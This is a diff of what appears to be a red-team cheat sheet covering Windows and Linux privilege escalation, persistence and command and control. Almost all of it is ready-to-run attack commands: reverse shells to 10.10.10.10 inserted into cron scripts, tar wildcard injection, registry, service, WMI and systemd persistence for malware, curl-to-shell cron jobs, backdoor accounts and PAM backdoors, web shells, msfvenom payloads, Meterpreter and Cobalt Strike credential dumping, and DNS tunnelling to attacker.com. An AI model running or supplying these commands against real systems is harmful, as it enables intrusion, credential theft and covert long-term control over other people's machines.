-sc config VulnerableService binPath= "net localgroup administrators user /add"
-sc stop VulnerableService
-sc start VulnerableService
-# Use Case: Service binary hijacking
-# Explanation: Replaces service binaries for privilege escalation
-
-
-Linux Service Exploitation
-bash
-# World-writable service files
+# Linux services
 find /etc/systemd/system /usr/lib/systemd/system -type f -perm -o+w 2>/dev/null
-# Use Case: Finding writable service files
-# Explanation: Locates systemd service files with weak permissions
+# Use: Writable services - finds writable service files
 
-# Service script exploitation
 echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 4444 >/tmp/f" >> /etc/cron.daily/backup.sh
-# Use Case: Service script modification
-# Explanation: Adds reverse shell to service scripts
+# Use: Cron exploitation - adds reverse shell to cron scripts
+```
 
-# Init script exploitation
-find /etc/init.d /etc/rc.d -type f -perm -o+w 2>/dev/null
-# Use Case: Init script privilege escalation
-# Explanation: Finds writable init scripts
-
-8.4 Scheduled Task & Cron Exploitation
-
-Windows Scheduled Tasks
-powershell
-# Scheduled task enumeration
+### Scheduled Task & Cron Exploitation
+```bash
+# Windows scheduled tasks
 schtasks /query /fo LIST /v
-Get-ScheduledTask | Where-Object {$_.State -eq "Ready"}
-# Use Case: Finding scheduled tasks for exploitation
-# Explanation: Enumerates scheduled tasks for weak permissions
+# Use: Task enumeration - lists scheduled tasks
 
-# Scheduled task creation for persistence
-schtasks /create /tn "SystemUpdate" /tr "C:\Windows\System32\malware.exe" /sc minute /mo 30 /ru SYSTEM
-# Use Case: Scheduled task privilege escalation
-# Explanation: Creates scheduled tasks for code execution
+schtasks /create /tn "SystemUpdate" /tr "C:\Windows\Temp\malware.exe" /sc minute /mo 30 /ru SYSTEM
+# Use: Task persistence - creates scheduled tasks
 
-# WMI event subscription
+# WMI events
 Get-WmiObject -Namespace root\Subscription -Class __EventFilter
-Get-WmiObject -Namespace root\Subscription -Class __EventConsumer
-Get-WmiObject -Namespace root\Subscription -Class __FilterToConsumerBinding
-# Use Case: WMI event-based persistence
-# Explanation: Checks for WMI event subscriptions
+# Use: Event subscription - checks WMI event subscriptions
 
-Linux Cron Jobs
-bash
-# Cron job enumeration
+# Linux cron jobs
 crontab -l
+# Use: Cron listing - shows user cron jobs
+
 cat /etc/crontab
-ls -la /etc/cron.*/*
-# Use Case: Finding cron jobs for exploitation
-# Explanation: Enumerates cron jobs and their permissions
+# Use: System cron - shows system cron jobs
 
-# Writable cron script exploitation
 echo "bash -i >& /dev/tcp/10.10.10.10/4444 0>&1" >> /etc/cron.hourly/cleanup.sh
-# Use Case: Cron script modification
-# Explanation: Adds reverse shell to cron scripts
+# Use: Cron backdoor - adds reverse shell to cron
 
-# Cron wildcard exploitation
-# In vulnerable backup script: tar -zcf /backups/backup-*.tar.gz *
+# Tar wildcard injection
 mkdir -p /tmp/--checkpoint=1
 echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 4444 >/tmp/f' > /tmp/--checkpoint-action=exec=sh.sh
-# Use Case: Tar wildcard injection
-# Explanation: Exploits tar wildcard usage in cron jobs
+# Use: Wildcard exploitation - exploits tar wildcard usage
+```
 
-9.PERSISTENCE MECHANISMS
+---
 
-9.1 Windows Persistence
+## 9. Persistence Mechanisms
 
-Registry Persistence Methods
-cmd
-# Run key persistence
+### Windows Persistence
+```bash
+# Registry persistence
 reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v Update /t REG_SZ /d "C:\Windows\Temp\malware.exe"
+# Use: Run key - executes at user logon
+
 reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit /t REG_SZ /d "C:\Windows\system32\userinit.exe,C:\Windows\Temp\malware.exe"
-# Use Case: Registry-based persistence
-# Explanation: Adds entries to run keys for automatic execution
+# Use: Userinit - executes during user initialization
 
 # Alternative registry locations
 reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v Update /t REG_SZ /d "C:\Windows\Temp\malware.exe"
-reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunServices" /v Update /t REG_SZ /d "C:\Windows\Temp\malware.exe"
-reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\Windows" /v Load /t REG_SZ /d "C:\Windows\Temp\malware.exe"
-# Use Case: Multiple registry persistence points
-# Explanation: Uses various registry locations for redundancy
+# Use: RunOnce - executes once at next logon
 
-# COM hijacking persistence
+# COM hijacking
 reg add "HKCU\Software\Classes\CLSID\{UNIQUE-GUID}\InprocServer32" /ve /t REG_SZ /d "C:\Windows\Temp\malware.dll"
-# Use Case: COM component hijacking
-# Explanation: Hijacks COM components for persistence
+# Use: COM persistence - hijacks COM components
 
-
-Scheduled Task Persistence
-cmd
-# Scheduled task creation
+# Scheduled tasks
 schtasks /create /tn "SystemUpdate" /tr "C:\Windows\Temp\malware.exe" /sc minute /mo 30 /ru SYSTEM
-schtasks /create /tn "Cleanup" /tr "cmd.exe /c powershell -ep bypass -f C:\Temp\payload.ps1" /sc onlogon /ru USERNAME
-# Use Case: Scheduled task-based persistence
-# Explanation: Creates scheduled tasks for recurring execution
+# Use: Scheduled execution - runs malware periodically
 
-# Hidden scheduled tasks
 schtasks /create /tn "Microsoft\Windows\SystemRestore\Update" /tr "C:\Windows\Temp\malware.exe" /sc hourly /ru SYSTEM
-# Use Case: Stealthy scheduled tasks
-# Explanation: Creates tasks in system folders for hiding
+# Use: Hidden tasks - creates tasks in system folders
 
-# Event-triggered tasks
-schtasks /create /tn "SecurityScan" /tr "C:\Windows\Temp\malware.exe" /sc onevent /ec System /mo "*[System/EventID=4624]"
-# Use Case: Event-driven persistence
-# Explanation: Triggers execution based on system events
+# WMI event subscription
+wmic /namespace:\\root\subscription PATH __EventFilter CREATE Name="UpdateFilter", Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
+# Use: WMI persistence - triggers execution on events
 
-WMI Event Subscription Persistence
-
-cmd
-# WMI event filter creation
-wmic /namespace:\\root\subscription PATH __EventFilter CREATE Name="UpdateFilter", EventNameSpace="root\cimv2", QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325"
-# Use Case: WMI-based persistence
-# Explanation: Creates WMI event filters for triggered execution
-
-# WMI event consumer
-wmic /namespace:\\root\subscription PATH CommandLineEventConsumer CREATE Name="UpdateConsumer", ExecutablePath="C:\Windows\Temp\malware.exe", CommandLineTemplate="C:\Windows\Temp\malware.exe"
-# Use Case: WMI event consumer creation
-# Explanation: Defines what executes when event triggers
-
-# WMI filter to consumer binding
-wmic /namespace:\\root\subscription PATH __FilterToConsumerBinding CREATE Filter='__EventFilter.Name="UpdateFilter"', Consumer='CommandLineEventConsumer.Name="UpdateConsumer"'
-# Use Case: WMI binding creation
-# Explanation: Links event filters to consumers
-
-Service Persistence
-cmd
-# Service creation
+# Service persistence
 sc create "WindowsUpdate" binPath= "C:\Windows\Temp\malware.exe" start= auto
-sc start WindowsUpdate
-# Use Case: Service-based persistence
-# Explanation: Creates Windows services for automatic execution
+# Use: Service creation - creates Windows service
 
-# Service modification
 sc config "VulnerableService" binPath= "C:\Windows\Temp\malware.exe"
-sc stop VulnerableService
-sc start VulnerableService
-# Use Case: Existing service modification
-# Explanation: Modifies existing services for persistence
+# Use: Service modification - changes existing service
+```
 
-# Service DLL hijacking
-sc config "AudioSrv" binPath= "C:\Windows\System32\malicious.dll"
-# Use Case: Service DLL replacement
-# Explanation: Replaces service DLLs with malicious ones
-
-9.2 Linux Persistence
-
-Cron Persistence Methods
-bash
-# User crontab persistence
+### Linux Persistence
+```bash
+# Cron persistence
 echo "*/5 * * * * curl http://10.10.10.10/payload.sh | sh" | crontab -
-(crontab -l ; echo "*/10 * * * * /tmp/.backdoor") | crontab -
-# Use Case: User-level cron persistence
-# Explanation: Adds cron jobs to user crontab
+# Use: User cron - adds to user crontab
 
-# System crontab persistence
 echo "*/5 * * * * root /tmp/.backdoor" >> /etc/crontab
+# Use: System cron - adds to system crontab
+
 echo "@reboot root /tmp/.backdoor" >> /etc/crontab
-# Use Case: System-level cron persistence
-# Explanation: Adds entries to system crontab
+# Use: Boot persistence - executes at system boot
 
-# Cron directory persistence
-echo "*/5 * * * * /tmp/.backdoor" > /etc/cron.d/persistence
-chmod +x /etc/cron.d/persistence
-# Use Case: Cron directory-based persistence
-# Explanation: Creates files in cron directories
-
-Service Persistence
-bash
-# Systemd service creation
+# Service persistence
 cat > /etc/systemd/system/network-update.service << EOF
 [Unit]
 Description=Network Update Service
@@ -2306,1738 +995,955 @@ After=network.target
 Type=simple
 ExecStart=/bin/bash -c 'while true; do /tmp/.backdoor; sleep 30; done'
 Restart=always
-RestartSec=30
 
 [Install]
 WantedBy=multi-user.target
 EOF
 
 systemctl enable network-update.service
-systemctl start network-update.service
-# Use Case: Systemd service persistence
-# Explanation: Creates systemd services for automatic execution
+# Use: Systemd service - creates persistent system service
 
-# Init.d service persistence
+# Init.d persistence
 cp backdoor.sh /etc/init.d/
 chmod +x /etc/init.d/backdoor.sh
 update-rc.d backdoor.sh defaults
-# Use Case: Init.d service persistence
-# Explanation: Uses traditional init system for persistence
+# Use: Init.d service - traditional init system persistence
 
-# RC.local persistence
-echo "/tmp/.backdoor &" >> /etc/rc.local
-chmod +x /etc/rc.local
-# Use Case: Boot-time persistence
-# Explanation: Adds execution to rc.local for boot-time running
-
-SSH Persistence
-bash
-# Authorized keys persistence
+# SSH persistence
 echo 'ssh-rsa AAAAB3NzaC1yc2E...' >> ~/.ssh/authorized_keys
-# Use Case: SSH key-based persistence
-# Explanation: Adds attacker's SSH key for remote access
+# Use: SSH keys - adds attacker's SSH key
 
-# Backdoor user creation
 useradd -r -s /bin/bash -G sudo backdooruser
 echo 'backdooruser:Password123!' | chpasswd
-# Use Case: Hidden user account creation
-# Explanation: Creates hidden user accounts for access
+# Use: Backdoor user - creates hidden user account
 
-# SSH config modification
-echo "PermitRootLogin yes" >> /etc/ssh/sshd_config
-echo "PasswordAuthentication yes" >> /etc/ssh/sshd_config
-echo "AllowUsers backdooruser" >> /etc/ssh/sshd_config
-systemctl restart ssh
-# Use Case: SSH service configuration modification
-# Explanation: Modifies SSH config for persistent access
-
-# SSH backdoor with PAM
+# PAM backdoor
 echo "auth sufficient pam_exec.so quiet /tmp/backdoor.sh" >> /etc/pam.d/sshd
-# Use Case: PAM-based SSH backdoor
-# Explanation: Uses PAM modules for authentication bypass
+# Use: PAM module - authentication bypass through PAM
+```
 
-9.3 Application Persistence
-
-Browser Persistence
-bash
-# Chrome extension persistence
-# Create malicious Chrome extension and install
-# Use Case: Browser-based persistence
-# Explanation: Installs malicious browser extensions
-
-# Firefox persistence through autoconfig
-echo 'pref("general.config.filename", "mozilla.cfg");' > /usr/lib/firefox/defaults/pref/local-settings.js
-echo 'lockPref("browser.startup.homepage", "http://malicious.com");' > /usr/lib/firefox/mozilla.cfg
-# Use Case: Firefox configuration persistence
-# Explanation: Modifies Firefox configuration for persistence
-
-Office & Document Persistence
-powershell
-# Word document macro persistence
-# Create Word document with auto-executing macro
-# Use Case: Document-based persistence
-# Explanation: Uses Office macros for code execution
-
-# Excel add-in persistence
-# Create malicious Excel add-in
-# Use Case: Excel-based persistence
-# Explanation: Uses Excel add-ins for persistence
-
-# Office template modification
-Copy-Item "C:\Windows\Temp\malware.dotm" "C:\Program Files\Microsoft Office\Root\Office16\STARTUP\"
-# Use Case: Office template persistence
-# Explanation: Modifies Office templates for automatic execution
-
-9.4 Network Persistence
-
-Netcat Backdoors
-bash
-# Netcat persistent backdoor
+### Network Persistence
+```bash
+# Netcat backdoors
 nc -lvp 4444 -e /bin/bash
-# Use Case: Simple network backdoor
-# Explanation: Creates netcat listener with command execution
+# Use: Simple backdoor - netcat listener with shell
 
-# Netcat with persistence script
 while true; do nc -lvp 4444 -e /bin/bash; done
-# Use Case: Resilient netcat backdoor
-# Explanation: Automatically restarts netcat if it dies
+# Use: Persistent backdoor - automatically restarts
 
-# Socat persistent backdoor
+# Socat backdoors
 socat TCP-LISTEN:4444,reuseaddr,fork EXEC:/bin/bash
-# Use Case: Advanced network backdoor
-# Explanation: Uses socat for more reliable backdoors
+# Use: Advanced backdoor - more reliable than netcat
 
-Web Shell Persistence
-bash
-# PHP web shell deployment
+# Web shells
 echo '<?php system($_GET["cmd"]); ?>' > /var/www/html/backdoor.php
-# Use Case: Web-based persistence
-# Explanation: Deploys web shells for remote access
+# Use: PHP web shell - command execution through web
 
-# ASP.NET web shell
 echo '<%@ Page Language="C#" %>...' > C:\inetpub\wwwroot\backdoor.aspx
-# Use Case: Windows web server persistence
-# Explanation: Deploys ASP.NET web shells
+# Use: ASP.NET shell - Windows web server backdoor
 
-# JSP web shell
 echo '<%= Runtime.getRuntime().exec(request.getParameter("cmd")) %>' > /opt/tomcat/webapps/ROOT/backdoor.jsp
-# Use Case: Java web application persistence
-# Explanation: Deploys JSP web shells
+# Use: JSP shell - Java application backdoor
+```
 
-10.COMMAND & CONTROL
+---
 
-10.1 Cobalt Strike
+## 10. Command & Control
 
-Beacon Configuration & Setup
-text
-# HTTP/HTTPS Beacon Configuration
+### Cobalt Strike
+```bash
+# Beacon configuration
 set payload windows/beacon_http/reverse_http
-set payload windows/beacon_https/reverse_https
 set host 10.10.10.10
 set port 80
 set sleeptime 30000
 set jitter 20
-set useragent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
-set watermark 12345678
-# Use Case: Standard HTTP/HTTPS C2 channels
-# Explanation: Configures basic Beacon settings for communication
+# Use: HTTP C2 - standard HTTP command and control
 
-# DNS Beacon Configuration
 set payload windows/beacon_dns/reverse_dns
 set dns_beacon dns1.domain.com
-set dns_idle 8.8.8.8
-set dns_sleep 0
-set dns_ttl 5
-# Use Case: DNS-based C2 for restricted environments
-# Explanation: Uses DNS queries for covert communication
+# Use: DNS C2 - covert communication through DNS
 
-# SMB Beacon Configuration
 set payload windows/beacon_smb/bind_pipe
 set pipename msagent_##
-# Use Case: Lateral movement and peer-to-peer communication
-# Explanation: Uses named pipes for internal network communication
+# Use: SMB C2 - peer-to-peer communication
 
-# Advanced Beacon Settings
-set max_retries 0
-set exit_thread true
-set obfuscate true
-set smart_encoding true
-set cleanup true
-# Use Case: Operational security and evasion
-# Explanation: Advanced settings for stealth and persistence
-
-Malleable C2 Profile Examples
-text
-# Amazon-like Traffic Profile
-http-get {
-    set uri "/s/ref=nb_sb_noss_1/167-3294888-0262949/field-keywords=books";
-    client {
-        header "Accept" "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8";
-        header "Accept-Language" "en-US,en;q=0.5";
-        header "Accept-Encoding" "gzip, deflate";
-        header "User-Agent" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0";
-        
-        metadata {
-            base64url;
-            prepend "session-token=";
-            parameter "session-token";
-        }
-    }
-    
-    server {
-        header "Server" "Server";
-        header "x-amz-id-1" "THKUYEZKCKPGY5T42PZT";
-        header "x-amz-id-2" "a21yZXR5MGFvYWhvNGc0OVBoTVBLV1FKV01WeE1nRnR0c1dwd05TZVZ1eXFVU0dXeU1n";
-        header "X-Frame-Options" "SAMEORIGIN";
-        header "Content-Encoding" "gzip";
-        
-        output {
-            netbios;
-            prepend "{\"products\":";
-            append "}";
-            print;
-        }
-    }
-}
-
-http-post {
-    set uri "/N4215/adj/amzn.us.sr.aps";
-    client {
-        header "Accept" "*/*";
-        header "Accept-Encoding" "gzip, deflate";
-        header "User-Agent" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0";
-        header "Content-Type" "text/xml";
-        
-        id {
-            base64url;
-            prepend "session-token=";
-            parameter "session-token";
-        }
-        
-        parameter "sz" "160x600";
-        parameter "oe" "oe=ISO-8859-1;";
-        
-        output {
-            base64;
-            prepend "{
-                \"a\":\"";
-            append "\",
-                \"n\":\"24\"
-            }";
-            print;
-        }
-    }
-    
-    server {
-        header "Server" "Server";
-        header "x-amz-id-1" "THKUYEZKCKPGY5T42PZT";
-        header "x-amz-id-2" "a21yZXR5MGFvYWhvNGc0OVBoTVBLV1FKV01WeE1nRnR0c1dwd05TZVZ1eXFVU0dXeU1n";
-        header "X-Frame-Options" "SAMEORIGIN";
-        
-        output {
-            netbios;
-            print;
-        }
-    }
-}
-Post-Exploitation Commands
-
-text
-# Privilege Escalation
+# Post-exploitation commands
 beacon> elevate svc-exe
-beacon> elevate uac-token-duplication
-beacon> elevate getsystem
-# Use Case: Gaining higher privileges
-# Explanation: Various methods to escalate privileges on target
+# Use: Privilege escalation - various escalation methods
 
-# Process Injection & Migration
 beacon> inject 1234 x64 tcp
-beacon> migrate 5678
-beacon> shinject 1234 /tmp/shellcode.bin
-# Use Case: Code injection and process migration
-# Explanation: Injects shellcode or migrates to stable processes
+# Use: Process injection - injects into other processes
 
-# Token Manipulation
 beacon> make_token DOMAIN\User Password123
-beacon> steal_token 1234
-beacon> rev2self
-# Use Case: Impersonating users and tokens
-# Explanation: Manipulates tokens for lateral movement
+# Use: Token manipulation - creates new tokens
 
-# Lateral Movement
 beacon> jump psexec64 10.10.10.5
-beacon> jump winrm64 10.10.10.5
-beacon> jump wmi64 10.10.10.5
-# Use Case: Moving between systems
-# Explanation: Various methods for lateral movement
+# Use: Lateral movement - moves to other systems
 
-# Persistence Mechanisms
 beacon> persistence schtasks-backdoor
-beacon> persistence registry-backdoor
-beacon> persistence service-backdoor
-# Use Case: Maintaining access
-# Explanation: Different persistence mechanisms
+# Use: Persistence - various persistence mechanisms
 
-# Information Gathering
 beacon> logonpasswords
-beacon> mimikatz sekurlsa::logonpasswords
-beacon> hashdump
-beacon> net view
+# Use: Credential harvesting - dumps credentials
+
 beacon> portscan 10.10.10.0/24 445,3389,5985
-# Use Case: Post-exploitation reconnaissance
-# Explanation: Gathers credentials and network information
+# Use: Network reconnaissance - scans internal network
+```
 
-Aggressor Script Examples
-text
-# Custom Beacon Commands
-alias custom-cmd {
-    local('$output');
-    $output = beacon_exec($1, "whoami /all");
-    blog($1, "Custom command output: " . $output);
-}
-
-# Automated Lateral Movement
-popup beacon_bottom {
-    item "&Deploy Beacon to Network" {
-        local('$computers');
-        $computers = beacon_exec($1, "net view");
-        # Parse computers and deploy
-    }
-}
-
-# Reporting Automation
-on beacon_initial {
-    show_message("New beacon from " . beacon_info($1, "internal"));
-    log_to_file("C:\\beacons.log", beacon_info($1, "computer") . " - " . beacon_info($1, "user"));
-}
-
-10.2 Metasploit Framework
-
-Payload Generation & Handling
-bash
-# Windows Payload Generation
-msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f exe -e x86/shikata_ga_nai -i 5 -o payload.exe
-# Use Case: Creating Windows executables
-# Explanation: Generates encoded Windows payloads
+### Metasploit Framework
+```bash
+# Payload generation
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f exe -o payload.exe
+# Use: Windows payload - creates Windows executable
 
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f dll -o payload.dll
-# Use Case: DLL payloads for injection
-# Explanation: Creates DLL format payloads
+# Use: DLL payload - creates DLL for injection
 
-msfvenom -p windows/meterpreter/reverse_https LHOST=10.10.10.10 LPORT=443 -f psh-cmd -o payload.ps1
-# Use Case: PowerShell payloads
-# Explanation: Generates PowerShell commands for execution
-
-# Linux Payload Generation
 msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f elf -o payload.elf
-# Use Case: Linux binary payloads
-# Explanation: Creates ELF binaries for Linux systems
+# Use: Linux payload - creates ELF binary
 
-msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f c -e x86/shikata_ga_nai
-# Use Case: Shellcode for custom loaders
-# Explanation: Generates C-style shellcode
-
-# Web Payloads
 msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f raw -o payload.php
-# Use Case: Web application payloads
-# Explanation: Creates PHP web shells
+# Use: PHP payload - creates web shell
 
-msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f war -o payload.war
-# Use Case: Java web application payloads
-# Explanation: Creates WAR files for Java apps
+# Handler setup
+msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 10.10.10.10; set LPORT 4444; exploit -j"
+# Use: Multi-handler - handles incoming connections
 
-# Advanced Encoding & Obfuscation
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f exe -e x86/shikata_ga_nai -i 10 -x legitsvc.exe -k -o malicious.exe
-# Use Case: Evasion techniques
-# Explanation: Uses encoding, iteration, and template binaries
+# Meterpreter commands
+meterpreter> sysinfo
+# Use: System information - gets target system info
 
-Handler Setup & Management
-bash
-# Multi-Handler Setup
-msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 10.10.10.10; set LPORT 4444; set ExitOnSession false; set EnableStageEncoding true; set StageEncoder x86/fnstenv_mov; exploit -j -z"
-# Use Case: Automated handler setup
-# Explanation: Starts handler with advanced options
+meterpreter> getuid
+# Use: User context - shows current user
 
-# Resource Scripts for Automation
-echo "use exploit/multi/handler" > handler.rc
-echo "set PAYLOAD windows/meterpreter/reverse_tcp" >> handler.rc
-echo "set LHOST 10.10.10.10" >> handler.rc
-echo "set LPORT 4444" >> handler.rc
-echo "set ExitOnSession false" >> handler.rc
-echo "exploit -j" >> handler.rc
+meterpreter> getsystem
+# Use: Privilege escalation - attempts to get SYSTEM
 
-msfconsole -r handler.rc
-# Use Case: Automated handler deployment
-# Explanation: Uses resource files for consistent setup
+meterpreter> migrate 1234
+# Use: Process migration - moves to stable process
 
-# Advanced Handler Configuration
-msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_https; set LHOST 10.10.10.10; set LPORT 443; set HandlerSSLCert /path/to/cert.pem; set StagerVerifySSLCert true; set OverrideLHOST 10.10.10.10; set OverrideRequestHost true; exploit -j"
-# Use Case: SSL/TLS encrypted C2
-# Explanation: Configures HTTPS handler with certificate
+meterpreter> download file.txt
+# Use: File download - downloads files from target
 
-Meterpreter Commands
-bash
-# Core System Commands
-meterpreter > sysinfo
-meterpreter > getuid
-meterpreter > getsystem
-meterpreter > rev2self
-# Use Case: System information and privileges
-# Explanation: Basic system reconnaissance and privilege escalation
+meterpreter> upload malicious.exe C:\\Windows\\Temp\\
+# Use: File upload - uploads files to target
 
-# File System Operations
-meterpreter > pwd
-meterpreter > ls
-meterpreter > download file.txt
-meterpreter > upload malicious.exe C:\\Windows\\Temp\\
-meterpreter > edit file.txt
-# Use Case: File system interaction
-# Explanation: Navigate, transfer, and edit files
+meterpreter> run post/windows/gather/win_privs
+# Use: Post modules - runs post-exploitation modules
 
-# Process Management
-meterpreter > ps
-meterpreter > migrate 1234
-meterpreter > kill 5678
-meterpreter > execute -f cmd.exe -i
-meterpreter > execute -H -f notepad.exe
-# Use Case: Process manipulation
-# Explanation: Manage and migrate between processes
+meterpreter> load kiwi
+# Use: Kiwi extension - loads Mimikatz functionality
 
-# Network Reconnaissance
-meterpreter > ipconfig
-meterpreter > route
-meterpreter > portfwd add -l 3389 -p 3389 -r 10.10.10.5
-meterpreter > arp
-# Use Case: Network information and pivoting
-# Explanation: Network configuration and port forwarding
+meterpreter> run persistence -X -i 30 -p 443 -r 10.10.10.10
+# Use: Persistence - creates persistent agent
+```
 
-# Privilege Escalation
-meterpreter > run post/windows/gather/win_privs
-meterpreter > run post/multi/recon/local_exploit_suggester
-meterpreter > getsystem
-meterpreter > run bypassuac
-# Use Case: System privilege escalation
-# Explanation: Various methods to gain higher privileges
-
-# Credential Harvesting
-meterpreter > load kiwi
-meterpreter > creds_all
-meterpreter > lsa_dump_sam
-meterpreter > lsa_dump_secrets
-meterpreter > golden_ticket_create
-# Use Case: Credential access and persistence
-# Explanation: Dump credentials and create golden tickets
-
-# Persistence Mechanisms
-meterpreter > run persistence -X -i 30 -p 443 -r 10.10.10.10
-meterpreter > run metsvc
-meterpreter > reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v Update -d 'C:\\windows\\temp\\malware.exe'
-# Use Case: Maintaining access
-# Explanation: Various persistence methods
-
-10.3 Custom C2 Frameworks
-
-Sliver C2 Framework
-bash
-# Implant Generation
-sliver generate --mtls 10.10.10.10 --os windows --arch amd64 --save /tmp/payload.exe
-# Use Case: Cross-platform implant creation
-# Explanation: Generates implants for various platforms
-
-sliver generate --http 10.10.10.10 --os linux --arch amd64 --format elf
-# Use Case: HTTP-based Linux implants
-# Explanation: Creates ELF binaries with HTTP C2
-
-sliver generate --dns example.com --os windows --arch amd64 --skip-symbols
-# Use Case: DNS-based C2 channels
-# Explanation: Uses DNS for covert communication
-
-# Listener Management
-sliver stage-listener --url tcp://10.10.10.10:4444 --profile windows_amd64
-# Use Case: Staging server setup
-# Explanation: Configures listeners for implant staging
+### Custom C2 Frameworks
+```bash
+# Sliver C2
+sliver generate --mtls 10.10.10.10 --os windows --arch amd64 --save payload.exe
+# Use: Cross-platform implants - generates various payloads
 
 sliver http --domain example.com --website /var/www/html
-# Use Case: HTTP/S listener setup
-# Explanation: Configures web-based C2 channels
+# Use: HTTP C2 - web-based command and control
 
-sliver dns --domains c2.example.com --lhost 10.10.10.10
-# Use Case: DNS listener configuration
-# Explanation: Sets up DNS-based C2 infrastructure
-
-# Implant Management
 sliver implants --build
-# Use Case: Implant compilation and management
-# Explanation: Builds and manages implant configurations
+# Use: Implant management - builds and manages implants
 
 sliver sessions -i
-# Use Case: Active session management
-# Explanation: Lists and interacts with active implants
+# Use: Session management - lists active sessions
 
 sliver use ABC123
-# Use Case: Session interaction
-# Explanation: Switches to specific implant session
+# Use: Session interaction - switches to specific session
 
-# Advanced Implant Features
-sliver (ABC123) > ps
-# Use Case: Process enumeration
-# Explanation: Lists running processes on target
-
-sliver (ABC123) > execute -o notepad.exe
-# Use Case: Remote command execution
-# Explanation: Executes commands on target system
-
-sliver (ABC123) > migrate 1234
-# Use Case: Process migration
-# Explanation: Migrates implant to different process
-
-sliver (ABC123) > getprivs
-# Use Case: Privilege escalation
-# Explanation: Attempts to gain higher privileges
-
-sliver (ABC123) > loot
-# Use Case: Data collection
-# Explanation: Manages collected data and credentials
-
-Empire & Starkiller
-powershell
-# Listener Setup
+# Empire
 (Empire: listeners) > set Host http://10.10.10.10:80
-(Empire: listeners) > set Port 80
-(Empire: listeners) > set DefaultDelay 5
 (Empire: listeners) > execute
-# Use Case: HTTP listener configuration
-# Explanation: Sets up Empire listeners for agents
+# Use: Listener setup - configures C2 listeners
 
-# Stager Generation
 (Empire: stagers) > set Listener http
 (Empire: stagers) > set OutFile /tmp/launcher.exe
 (Empire: stagers) > execute
-# Use Case: Payload generation
-# Explanation: Creates stagers for initial compromise
+# Use: Stager generation - creates initial payloads
 
-# Agent Interaction
 (Empire: agents) > interact ABC123
 (Empire: ABC123) > shell whoami
-(Empire: ABC123) > upload /tmp/file.exe C:\\Windows\\Temp\\
-(Empire: ABC123) > download C:\\Windows\\Temp\\file.txt
-# Use Case: Agent command and control
-# Explanation: Interacts with compromised systems
+# Use: Agent interaction - executes commands on agents
+```
 
-# Module Execution
-(Empire: ABC123) > module credentials/mimikatz/logonpasswords
-(Empire: ABC123) > execute
-# Use Case: Post-exploitation modules
-# Explanation: Runs various post-exploitation modules
-
-(Empire: ABC123) > module lateral_movement/invoke_wmi
-(Empire: ABC123) > set ComputerName 10.10.10.5
-(Empire: ABC123) > set Listener http
-(Empire: ABC123) > execute
-# Use Case: Lateral movement
-# Explanation: Moves to other systems in network
-
-10.4 Covert Channels & Communication
-
-DNS Tunneling
-bash
-# dnscat2 Setup
-# Server (Attacker)
+### Covert Channels & Communication
+```bash
+# DNS tunneling
 sudo ruby dnscat2.rb --dns domain=attacker.com --secret=MySecret
-# Use Case: DNS-based C2 channels
-# Explanation: Sets up DNS tunneling server
+# Use: DNS C2 - command and control through DNS
 
-# Client (Target)
-dnscat2.exe --dns server=attacker.com,port=53 --secret=MySecret
-# Use Case: DNS client connection
-# Explanation: Connects to DNS tunneling server
+dnscat2.exe --dns server=attacker.com --secret=MySecret
+# Use: DNS client - connects to DNS tunneling server
 
-dnscat2.exe --dns domain=attacker.com --secret=MySecret --max-retransmits 5 --timeout 10
-# Use Case: Advanced DNS tunneling
-# Explanation: Configures retransmission and timeout settings
+# ICMP tunneling
+ptunnel-ng -x password -p 22 -l 2222
+# Use: ICMP C2 - tunnels traffic through ICMP
 
-# Iodine DNS Tunneling
-# Server (Attacker)
-iodined -f -c -P password 10.0.0.1 tunnel.attacker.com
-# Use Case: IP-over-DNS tunneling
-# Explanation: Creates virtual network interface over DNS
-
-# Client (Target)
-iodine -f -P password tunnel.attacker.com
-# Use Case: Client connection to DNS tunnel
-# Explanation: Connects to iodine server
-
-iodine -f -P password -r tunnel.attacker.com 8.8.8.8
-# Use Case: DNS tunnel with specific resolver
-# Explanation: Uses custom DNS resolver
-
-HTTP/HTTPS Tunneling
-bash
-# reGeorg HTTP Tunneling
-# Upload tunnel.aspx to web server
+# HTTP tunneling
 python reGeorgSocksProxy.py -p 8080 -u http://target.com/tunnel.aspx
